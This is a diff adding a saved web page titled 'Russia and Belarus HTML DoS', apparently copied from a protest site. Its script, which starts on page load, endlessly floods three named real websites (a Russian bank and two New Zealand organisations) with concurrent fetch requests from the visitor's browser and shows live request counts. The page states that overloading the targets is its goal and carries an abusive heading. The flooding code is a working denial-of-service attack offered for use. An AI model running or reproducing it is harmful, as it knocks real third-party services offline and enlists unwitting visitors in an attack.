@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<!-- saved from url=(0021)https://norussian.tk/ -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<title>Russia and Belarus HTML DoS</title>
+<link rel="stylesheet" href="./Russia and Belarus HTML DoS_files/style.css">
+<script async="" src="./Russia and Belarus HTML DoS_files/invisible.js.download"></script><script src="chrome-extension://mooikfkahbdckldjjndioackbalphokd/assets/prompt.js"></script></head>
+<body>
+<p>Reformated from https://stop-russian-desinformation.near.page</p>
+<h1 class="title">Seeya Cunts</h1>
+
+<h3 class="desc">Here is the stats of your session (the links and the number of the requests that were sent from
+your
+browser):<br>
+Failed to fetch is normal - if any site has that - that means their servers are under load and are dropping
+packets - which is the goal!</h3>
+<div id="stats" class="stats"><pre>{
+  "https://absolutbank.ru/": {
+    "number_of_requests": 374,
+    "number_of_errored_responses": 2,
+    "error_message": "Failed to fetch"
+  },
+  "https://voicesforfreedom.co.nz/'": {
+    "number_of_requests": 171,
+    "number_of_errored_responses": 171,
+    "error_message": "Failed to fetch"
+  },
+ "https://www.tfrc.org.nz/'": {
+    "number_of_requests": 171,
+    "number_of_errored_responses": 171,
+    "error_message": "Failed to fetch"
+  },
+}</pre></div>
+<div id="errors"></div>
+
+<script>
+        var targets = {
+            'https://absolutbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+			'https://voicesforfreedom.co.nz/': { number_of_requests: 0, number_of_errored_responses: 0 },
+			'https://www.tfrc.org.nz/': { number_of_requests: 0, number_of_errored_responses: 0 }
+     
+       }
+
+        var statsEl = document.getElementById('stats');
+        function printStats() {
+            statsEl.innerHTML = '<pre>' + JSON.stringify(targets, null, 2) + '</pre>'
+        }
+        setInterval(printStats, 100);
+
+        var CONCURRENCY_LIMIT = 200
+        var queue = []
+
+        async function fetchWithTimeout(resource, options) {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), options.timeout);
+            return fetch(resource, {
+                signal: controller.signal
+            }).then((response) => {
+                clearTimeout(id);
+                return response;
+            }).catch((error) => {
+                clearTimeout(id);
+                throw error;
+            });
+        }
+
+        async function flood(target) {
+            while (true) {
+                if (queue.length > CONCURRENCY_LIMIT) {
+                    await queue.shift()
+                }
+                queue.push(
+                    fetchWithTimeout(target, { timeout: 600 })
+                        .catch((error) => {
+                            if (error.code === 20 /* ABORT */) {
+                                return;
+                            }
+                            targets[target].number_of_errored_responses++;
+                            targets[target].error_message = error.message
+                        })
+                        .then((response) => {
+                            if (response && !response.ok) {
+                                targets[target].number_of_errored_responses++;
+                                targets[target].error_message = response.statusText
+                            }
+                            targets[target].number_of_requests++;
+                        })
+
+
+                )
+            }
+        }
+
+        //Start
+        Object.keys(targets).map(flood)
+    </script>
+<script type="text/javascript">(function(){window['__CF$cv$params']={r:'6e44b69188306a60',m:'PIPbGP_S1mXxbRPZoDI72yYfJ9DbgzkU4unAKRD_ImA-1645999511-0-AWEtaikTl6n05y9UmirI0wb/SYDwAeOYhTKmmrrorhxUiTlB8T0Y9ClLKquWLz0/5VKZpdPlUT+b6ebusyUVYPymEAsj5N6m2lQqI2khk70sIEKaFFkwqZvLz+g3nHCXsg==',s:[0x08e88e8c8c,0x09f23fc5f5],u:'/cdn-cgi/challenge-platform/h/g'}})();</script>
+
+</body></html>
